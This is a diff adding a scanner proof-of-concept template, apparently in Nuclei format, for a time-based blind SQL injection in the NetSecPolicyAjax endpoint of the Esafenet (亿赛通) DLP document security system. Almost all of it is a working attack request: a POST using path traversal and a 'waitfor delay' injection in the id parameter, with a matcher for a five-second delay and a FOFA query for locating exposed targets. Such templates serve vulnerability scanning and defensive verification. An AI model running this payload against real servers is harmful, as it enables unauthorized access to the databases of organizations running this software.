@@ -1,0 +1,31 @@
+id: poc-usafwwz3t355nk8o
+info:
+  name: 亿赛通电子文档安全管理系统NetSecPolicyAjax存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/usafwwz3t355nk8o
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: usafwwz3t355nk8o
+    fofa: app="亿赛通-DLP"
+http:
+- raw:
+  - 'POST /CDGServer3/js/../NetSecPolicyAjax HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    command=upPriority&id=-1''waitfor delay ''0:0:5''--'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
